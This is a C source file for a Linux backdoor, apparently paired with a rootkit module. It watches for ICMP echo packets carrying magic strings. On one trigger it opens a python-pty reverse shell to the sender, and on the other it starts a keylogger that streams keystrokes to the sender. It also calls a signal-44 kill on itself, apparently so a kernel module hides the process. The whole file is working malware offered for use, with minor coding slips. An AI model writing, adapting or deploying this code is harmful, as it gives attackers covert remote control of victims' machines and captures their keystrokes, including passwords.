#include <ctype.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

char *lower(char *s) { for (char *p = s; *p; p++) *p = tolower(*p); return s; }

#define KEYLOGGER_MAGIC_PACKET "FUXSOCY_RUN_KEYLOGGER"
#define KEYLOGGER_PORT 46242

#define REVERSE_SHELL_MAGIC_PACKET "FUXSOCY_RUN_BACKDOOR"
#define REVERSE_SHELL_PORT 42069
char keyboard_event_path[32];
int fd;

void reverse_shell(in_addr_t s_addr) {
	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_port = htons(REVERSE_SHELL_PORT);
	sa.sin_addr.s_addr = s_addr;

	int sockt = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0)
		return;

	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);

	//we already know python is installed
	char *const argv[] = { "python3", "-c", "import pty, os; os.putenv('TERM','xterm'); os.system('clear'); pty.spawn('/bin/bash')", NULL };
	execve("/usr/bin/python3", argv, NULL);
}

void keylogger(in_addr_t s_addr) {
	struct sockaddr_in sa;
	char key[32];
	sa.sin_family = AF_INET;
	sa.sin_port = htons(KEYLOGGER_PORT);
	sa.sin_addr.s_addr = s_addr;

	int sockt = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(sockt, (struct sockaddr *)&sa, sizeof(sa)) != 0)
		return;

	struct input_event ev;
	while (1) {
		read(fd, &ev, sizeof(ev));
		if (ev.type == EV_KEY && ev.value == 1) {
			snprintf(key, sizeof(key), "%d\n", ev.code);
			if (send(sockt, key, strlen(key), 0) < 0)
				return;
		}
	}
}
void hide_self() {
	char buffer[16];
	snprintf(buffer, sizeof(buffer), "kill -44 %d", getpid());
	system(buffer);
}
int get_keyboard_type() {
	char name[256];
	for (int i = 0;; i++) {
		snprintf(keyboard_event_path, sizeof(keyboard_event_path), "/dev/input/event%d", i);
		if (open(keyboard_event_path, O_RDONLY) < 0) break;
		if (ioctl(fd, EVIOCGNAME(sizeof(name)), name) >= 0 && strstr(lower(name), "keyboard")) return 0;
	}
	fd = open(keyboard_event_path, O_RDONLY);
	return -1;
}
int main() {
	hide_self();
	bool has_keyboard = true;
	char buffer[1024];
	if (get_keyboard_type()) has_keyboard = false;
	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	while (1) {
		int len = recv(sockfd, buffer, sizeof(buffer), 0);
		struct iphdr *ip = (void *)buffer;
		if (ip->protocol != IPPROTO_ICMP) continue;
		struct icmphdr *icmp = (void *)(buffer + ip->ihl * 4);
		if (icmp->type != ICMP_ECHO) continue;
		char *payload = (void *)(icmp + 1);
		if (!memcmp(payload, REVERSE_SHELL_MAGIC_PACKET, sizeof(REVERSE_SHELL_MAGIC_PACKET)-1)) {
			pid_t pid = fork();
			if (!pid) {
				//the module hides the child process as well
				reverse_shell(ip->saddr);
				_exit(0);
			}
		}
		if (!memcmp(payload, KEYLOGGER_MAGIC_PACKET, sizeof(KEYLOGGER_MAGIC_PACKET)-1)) {
			if (!has_keyboard) continue;
			pid_t pid = fork();
			if (!pid) {
				keylogger(ip->saddr);
				_exit(0);
			}
		}
	}
	close(fd);
}

